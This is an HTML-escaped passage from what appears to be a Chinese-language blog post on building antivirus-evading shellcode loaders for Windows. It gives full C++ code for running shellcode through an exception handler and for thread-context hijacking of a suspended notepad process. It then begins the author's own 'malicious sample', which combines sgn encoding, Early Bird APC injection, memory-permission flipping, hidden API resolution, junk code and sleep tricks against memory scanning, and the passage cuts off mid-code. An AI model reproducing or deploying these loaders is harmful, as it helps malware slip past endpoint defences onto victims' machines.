&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/section:.data,RWE&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ExceptFilter&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ((&lt;span class=&#34;built_in&#34;&gt;void&lt;/span&gt;(*NTAPI)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)) &amp;amp; shellcode)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EXCEPTION_CONTINUE_EXECUTION;&lt;span class=&#34;comment&#34;&gt;//返回出错位置重新执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _try&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c = a / b;  &lt;span class=&#34;comment&#34;&gt;//只要能触发异常即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _except(&lt;span class=&#34;built_in&#34;&gt;ExceptFilter&lt;/span&gt;()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 需要主动触发异常，当然可以填充大量代码将触发异常的代码写的很隐蔽，还可以做到反调试的效果，也需要配合其他手段食用。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;SetContext Hijack Thread (线程上下文环境劫持)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 简单理解就是劫持线程的上下文环境，然后强行将 eip/rip 指向 shellcode 并执行。&lt;br /&gt;
劫持流程：&lt;br /&gt;
1、创建一个挂起的合法进程&lt;br /&gt;
 2、将恶意 shellcode 写入该进程&lt;br /&gt;
 3、将 eip/rip 指向该地址&lt;br /&gt;
 4、恢复线程&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    STARTUPINFOA si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(si);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESS_INFORMATION pi = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, FALSE, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;SuspendThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpBuffer = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(pi.hProcess, lpBuffer, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     CONTEXT ctx = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     ctx.ContextFlags = CONTEXT_ALL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;GetThreadContext&lt;/span&gt;(pi.hThread, &amp;amp;ctx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     ctx.Rip = (DWORD64)lpBuffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;SetThreadContext&lt;/span&gt;(pi.hThread, &amp;amp;ctx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;本地测试效果和其他手法演示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地测试效果和其他手法演示&#34;&gt;#&lt;/a&gt; 本地测试效果和其他手法演示&lt;/h4&gt;
&lt;p&gt;本次编写的恶意样本手法组合为：sgn + Early Bird + RW/RX/NOA 转换 + 自写 Win32API + junkCode 填充 + Sleep (15000)(循环真睡眠) 规避主动内存扫描&lt;br /&gt;
主要代码：&lt;br /&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker,&lt;span class=&#34;string&#34;&gt;&amp;quot;/subsystem:\&amp;quot;Windows\&amp;quot; /entry:\&amp;quot;mainCRTStartup\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; fish[&lt;span class=&#34;number&#34;&gt;307910&lt;/span&gt;] = &amp;#123;......&amp;#125;   &lt;span class=&#34;comment&#34;&gt;//sgn后的shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* text_path = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* CreateP = &lt;span class=&#34;string&#34;&gt;&amp;quot;CreateProcessA&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* VirPro = &lt;span class=&#34;string&#34;&gt;&amp;quot;VirtualProtect&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* VirAloc = &lt;span class=&#34;string&#34;&gt;&amp;quot;VirtualAllocEx&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* WriteMem = &lt;span class=&#34;string&#34;&gt;&amp;quot;WriteProcessMemory&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* QueAPC = &lt;span class=&#34;string&#34;&gt;&amp;quot;QueueUserAPC&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pCreateProcessA)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCSTR                lpApplicationName,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSTR                 lpCommandLine,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSECURITY_ATTRIBUTES lpProcessAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSECURITY_ATTRIBUTES lpThreadAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	BOOL                  bInheritHandles,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD                 dwCreationFlags,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID                lpEnvironment,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCSTR                lpCurrentDirectory,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPSTARTUPINFOA        lpStartupInfo,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPPROCESS_INFORMATION lpProcessInformation&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;LPVOID&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pVirtualAllocEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE hProcess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 